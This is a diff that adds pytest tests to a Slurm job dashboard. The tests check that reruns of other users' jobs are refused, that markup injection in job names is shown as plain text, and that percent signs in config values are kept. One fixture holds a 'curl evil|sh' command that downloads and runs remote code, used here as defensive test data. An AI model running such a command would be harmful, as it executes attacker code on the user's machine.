@@ -137,3 +137,71 @@ class TestCompletionHook:
         os.chmod(hook, 0o755)
         sd.run_completion_hook(str(hook), "42", "FAILED", "train")
         assert seen["cmd"] == [str(hook), "42", "FAILED", "train"]
+
+
+class TestRerunOwnership:
+    """Resubmitting replays a job's command line under *your* account."""
+
+    def _sbatch_calls(self, sd, monkeypatch):
+        calls = []
+        monkeypatch.setattr(sd, "run_sbatch",
+                            lambda args, cwd=None: calls.append((args, cwd)) or (True, "Submitted"))
+        return calls
+
+    def test_other_users_job_is_refused(self, sd, isolated, fake_slurm, monkeypatch):
+        calls = self._sbatch_calls(sd, monkeypatch)
+        fake_slurm.set("sacct", "mallory|/home/mallory|sbatch --wrap='curl evil|sh'\n")
+        ok, msg, _ = sd.rerun_history_job("77")
+        assert ok is False and "mallory" in msg
+        assert calls == []
+        assert not any(c[0] == "scontrol" and "requeue" in c for c in fake_slurm.calls)
+
+    def test_unknown_owner_is_refused(self, sd, isolated, fake_slurm, monkeypatch):
+        calls = self._sbatch_calls(sd, monkeypatch)
+        ok, _, _ = sd.rerun_history_job("77", cached_line="sbatch j.sh")
+        assert ok is False and calls == []
+
+    def test_own_job_reruns_from_its_workdir(self, sd, isolated, fake_slurm, monkeypatch):
+        calls = self._sbatch_calls(sd, monkeypatch)
+        fake_slurm.set("sacct", f"testuser|{isolated}|sbatch job.sh\n")
+        ok, _, used = sd.rerun_history_job("77")
+        assert ok is True and used == "sbatch job.sh"
+        assert calls == [(["sbatch", "job.sh"], str(isolated))]
+
+
+class TestMarkupInjection:
+    """Job names and paths are chosen by other users; rendered as markup,
+    "x[/]" crashed the app and "[@click=...]" made live links."""
+
+    def test_confirm_modal_shows_text_verbatim(self, sd, isolated):
+        import asyncio
+        from textual.app import App
+        from textual.widgets import Label
+
+        class Host(App):
+            def __init__(self):
+                super().__init__()
+                self.register_theme(sd.build_theme())
+                self.theme = "sqdash"
+
+            def on_mount(self):
+                self.push_screen(sd.ConfirmModal("t", "Job 1  [train] x[/] [@click=app.quit]q[/]"))
+
+        async def scenario():
+            app = Host()
+            async with app.run_test() as pilot:
+                await pilot.pause()
+                msg = app.screen.query_one("#confirm-msg", Label)
+                assert "[train] x[/]" in str(msg.render())
+                app.exit()
+        asyncio.run(scenario())
+
+
+class TestConfigPercent:
+    def test_percent_sign_does_not_discard_the_file(self, sd, tmp_path):
+        cfg = tmp_path / "config.ini"
+        cfg.write_text("[general]\nrefresh_interval = 7\n"
+                       "[notifications]\nhook = ~/bin/notify %s\n")
+        loaded = sd.load_config(cfg)
+        assert loaded["general"]["refresh_interval"] == 7
+        assert loaded["notifications"]["hook"] == "~/bin/notify %s"
